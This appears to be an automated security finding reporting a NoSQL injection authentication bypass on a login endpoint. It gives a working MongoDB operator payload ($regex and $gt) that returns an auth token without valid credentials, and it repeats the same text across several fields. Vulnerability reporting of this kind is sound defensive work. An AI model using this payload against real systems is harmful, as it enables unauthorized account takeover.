summary: NoSQL Injection via JSON Object Injection in Login @ /rest/user/login

data.observation: POST /rest/user/login with body {"email":{"$regex":".*"},"password":{"$gt":""}} returns HTTP 200 with {"authentication":{"token":"eyJ..."}} proving authentication bypass. The $regex .* matches any email and $gt "" matches any password string in MongoDB.
data.proof: POST /rest/user/login with body {"email":{"$regex":".*"},"password":{"$gt":""}} returns HTTP 200 with {"authentication":{"token":"eyJ..."}} proving authentication bypass. The $regex .* matches any email and $gt "" matches any password string in MongoDB.
data.title: NoSQL Injection via JSON Object Injection in Login
data.stdout: POST /rest/user/login with body {"email":{"$regex":".*"},"password":{"$gt":""}} returns HTTP 200 with {"authentication":{"token":"eyJ..."}} proving authentication bypass. The $regex .* matches any email and $gt "" matches any password string in MongoDB.

      "path": "/api/Users",
      "method": "GET",
